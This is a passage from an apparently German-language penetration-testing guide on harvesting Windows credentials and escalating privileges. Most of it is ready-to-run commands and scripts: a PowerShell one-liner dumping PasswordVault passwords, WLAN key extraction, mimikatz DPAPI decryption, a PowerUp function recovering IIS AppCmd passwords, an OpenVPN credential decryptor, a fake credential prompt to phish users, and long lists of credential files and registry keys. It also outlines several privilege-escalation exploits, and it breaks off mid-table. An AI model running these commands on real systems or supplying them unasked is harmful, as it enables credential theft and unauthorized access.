Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstoken und Klartextpasswörter im Universal Windows Platform (UWP) `PasswordVault` (in `vaultcmd` auch als `Web Credentials` verfügbar). Dieser Speicherbereich ist sitzungsisoliert und kann nativ ohne administrative Rechte oder `SeDebugPrivilege` entschlüsselt werden.

Führe diesen PowerShell-Befehl innerhalb der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter zu dumpen und zu entschlüsseln:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

Die **Data Protection API (DPAPI)** stellt eine Methode zur symmetrischen Verschlüsselung von Daten bereit und wird hauptsächlich innerhalb des Windows-Betriebssystems zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um erheblich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden die Authentifizierungsgeheimnisse der Systemdomäne verwendet.

Verschlüsselte RSA-Schlüssel von Benutzern werden mithilfe von DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` die [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master Key, der die privaten Schlüssel des Benutzers in derselben Datei schützt, gespeichert wird**, besteht typischerweise aus 64 Bytes zufälliger Daten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, sodass dessen Inhalt nicht über den Befehl `dir` in CMD aufgelistet werden kann, jedoch über PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Du kannst das **mimikatz module** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files protected by the master password** befinden sich normalerweise unter:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Du kannst das **mimikatz module** `dpapi::cred` mit dem entsprechenden `/masterkey` verwenden, um die Daten zu entschlüsseln.\
Du kannst mit dem Modul `sekurlsa::dpapi` viele **DPAPI**-**masterkeys** aus dem **memory** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** werden häufig für **scripting**- und Automatisierungsaufgaben verwendet, um verschlüsselte Zugangsdaten bequem zu speichern. Die Zugangsdaten werden mit **DPAPI** geschützt, was normalerweise bedeutet, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Um PS credentials aus der Datei, die sie enthält, zu **decrypt**, kannst du Folgendes ausführen:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WLAN
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Sie befinden sich unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Zuletzt ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Anmeldeinformationsverwaltung für Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Verwenden Sie das **Mimikatz**-Modul `dpapi::rdg` mit dem entsprechenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Sie können mit dem Mimikatz-Modul `sekurlsa::dpapi` **zahlreiche DPAPI-Masterkeys aus dem Speicher extrahieren**

### Sticky Notes

Menschen verwenden die Sticky-Notes-App auf Windows-Workstations häufig, um **Passwörter** und andere Informationen zu **speichern**, ohne zu wissen, dass es sich dabei um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und ist es immer wert, nach ihr zu suchen und sie zu untersuchen.

### AppCmd.exe

**Beachten Sie, dass Sie zum Wiederherstellen von Passwörtern aus AppCmd.exe Administratorrechte benötigen und die Anwendung mit einer hohen Integritätsstufe ausführen müssen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei existiert, ist es möglich, dass **Credentials** konfiguriert wurden und **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Prüfe, ob `C:\Windows\CCM\SCClient.exe` existiert .\
**Installer werden mit SYSTEM-Rechten ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registry (Anmeldedaten)

### Putty-Anmeldedaten
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty-SSH-Hostschlüssel
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden. Daher solltest du prüfen, ob sich dort etwas Interessantes befindet:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie innerhalb dieses Pfads einen Eintrag finden, handelt es sich wahrscheinlich um einen gespeicherten SSH key. Er wird verschlüsselt gespeichert, kann aber problemlos mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
Weitere Informationen zu dieser Technik finden Sie hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der `ssh-agent`-Dienst nicht ausgeführt wird und Sie möchten, dass er beim Booten automatisch gestartet wird, führen Sie Folgendes aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH bei einem Computer anzumelden. Die Registrierung HKCU\Software\OpenSSH\Agent\Keys existiert nicht, und Procmon hat bei der asymmetrischen Schlüsselauthentifizierung keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM- und SYSTEM-Backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Anmeldedaten
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher war eine Funktion verfügbar, mit der benutzerdefinierte lokale Administratorkonten über Group Policy Preferences (GPP) auf einer Gruppe von Computern bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens konnten die als XML-Dateien in SYSVOL gespeicherten Group Policy Objects (GPOs) von jedem Domänenbenutzer abgerufen werden. Zweitens konnten die in diesen GPPs enthaltenen Passwörter, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standardschlüssels verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein erhebliches Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu verringern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien mit einem nicht leeren Feld `cpassword` sucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und unterstützt dadurch die Identifizierung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Mit crackmapexec Passwörter abrufen:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel für web.config mit Zugangsdaten:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Zugangsdaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach Zugangsdaten fragen

Du kannst den **Benutzer jederzeit auffordern, seine Zugangsdaten oder sogar die Zugangsdaten eines anderen Benutzers einzugeben**, wenn du denkst, dass er sie kennen könnte (beachte, dass es **wirklich riskant** ist, den Client direkt nach den **Zugangsdaten** zu fragen):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen mit Zugangsdaten**

Bekannte Dateien, die früher **Passwörter** im **Klartext** oder als **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Durchsuche alle vorgeschlagenen Dateien:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Anmeldedaten im RecycleBin

Du solltest auch den Papierkorb überprüfen, um darin nach Anmeldedaten zu suchen.

Um von mehreren Programmen gespeicherte **Passwörter wiederherzustellen**, kannst du Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registrierung

**Weitere mögliche Registrierungsschlüssel mit Anmeldedaten**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Du solltest nach dbs suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert werden.\
Überprüfe außerdem den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise **Passwörter** gespeichert sind.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten verschiedener Programmiersprachen ermöglicht. Jede COM-Komponente wird über eine Class ID (CLSID) **identifiziert**, und jede Komponente stellt ihre Funktionalität über eine oder mehrere Schnittstellen bereit, die durch Interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** beziehungsweise **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry wird durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** erstellt.

Innerhalb der CLSIDs dieser Registry findest du den untergeordneten Registry-Schlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread-neutral) sein kann.

![Browserverlauf - COM DLL Overwriting: Innerhalb der CLSIDs dieser Registry findest du den untergeordneten Registry-Schlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Wenn du grundsätzlich **eine der DLLs überschreiben** kannst, die ausgeführt werden, könntest du **deine Privilegien eskalieren**, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu erfahren, wie Angreifer COM Hijacking als Persistenzmechanismus verwenden, siehe:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registry**

**Suche nach Dateiinhalten**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Suche nach einer Datei mit einem bestimmten Dateinamen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin, das ich erstellt habe, um **automatisch jedes Metasploit-POST-Modul auszuführen, das innerhalb des Opfer-Systems nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die die auf dieser Seite erwähnten Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sessions**, **Benutzernamen** und **Passwörtern** verschiedener Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handles

Stell dir vor, dass **ein als SYSTEM laufender Prozess einen neuen Prozess** (`OpenProcess()`) **mit vollständigem Zugriff öffnet**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Privilegien, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **vollständigen Zugriff auf den Prozess mit niedrigen Privilegien hast**, kannst du den **offenen Handle zu dem privilegierten Prozess, der mit** `OpenProcess()` **erstellt wurde, übernehmen und einen** **Shellcode** **injizieren**.\
[In diesem Beispiel findest du weitere Informationen dazu, **wie diese Schwachstelle erkannt und ausgenutzt werden kann**.](leaked-handle-exploitation.md)\
[In **diesem anderen Beitrag findest du eine ausführlichere Erklärung dazu, wie weitere offene Handles von geerbten Prozessen und Threads mit unterschiedlichen Berechtigungsstufen (nicht nur vollständigem Zugriff) getestet und missbraucht werden können**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared-Memory-Segmente, die als **Pipes** bezeichnet werden, ermöglichen die Kommunikation und Datenübertragung zwischen Prozessen.

Windows stellt eine Funktion namens **Named Pipes** bereit, mit der voneinander unabhängige Prozesse Daten gemeinsam nutzen können, sogar über verschiedene Netzwerke hinweg. Dies ähnelt einer Client/Server-Architektur mit den Rollen **Named-Pipe-Server** und **Named-Pipe-Client**.

Wenn Daten von einem **Client** über eine Pipe gesendet werden, kann der **Server**, der die Pipe eingerichtet hat, die **Identität** des **Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet dies die Möglichkeit, **höhere Privilegien zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Das folgende Tool ermöglicht außerdem das **Abfangen einer Named-Pipe-Kommunikation mit einem Tool wie Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht das Auflisten und Anzeigen aller Pipes, um privescs zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony-Tapsrv-Remote-DWORD-Write zu RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein remote authentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibvorgang** in jede vorhandene Datei umzuwandeln, die von `NETWORK SERVICE` beschrieben werden kann, und anschließend Telephony-Administratorrechte zu erlangen und eine beliebige DLL als Dienst zu laden. Vollständiger Ablauf:

- `ClientAttach` mit `pszDomainUser`, das auf einen vorhandenen, beschreibbaren Pfad gesetzt ist → Der Dienst öffnet ihn über `CreateFileW(..., OPEN_EXISTING)` und verwendet ihn für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in diesen Handle. Registriere mit `LRegisterRequestRecipient` (`Req_Func 61`) eine Leitungs-App, löse `TRequestMakeCall` (`Req_Func 121`) aus, rufe die Daten mit `GetAsyncEvents` (`Req_Func 0`) ab und deregistriere bzw. beende anschließend, um deterministische Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, verbinde dich erneut und rufe `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Informationen:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Verschiedenes

### Dateierweiterungen, die unter Windows Aktionen ausführen können

Siehe die Seite **[https://filesec.io/](https://filesec.io/)**

### Missbrauch von Protocol Handler / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Überwachen von Befehlszeilen auf Passwörter**

Wenn du eine Shell als Benutzer erhältst, werden möglicherweise geplante Tasks oder andere Prozesse ausgeführt, die **Zugangsdaten über die Befehlszeile übergeben**. Das folgende Script erfasst alle zwei Sekunden die Befehlszeilen der Prozesse, vergleicht den aktuellen Zustand mit dem vorherigen Zustand und gibt alle Unterschiede aus.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Vom Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Oberfläche hast (über Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, von einem unprivilegierten Benutzer aus ein Terminal oder einen beliebigen anderen Prozess wie „NT\AUTHORITY SYSTEM“ auszuführen.

Dadurch ist es möglich, Privilegien zu eskalieren und gleichzeitig UAC mit derselben Sicherheitslücke zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binary ist von Microsoft signiert und herausgegeben.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
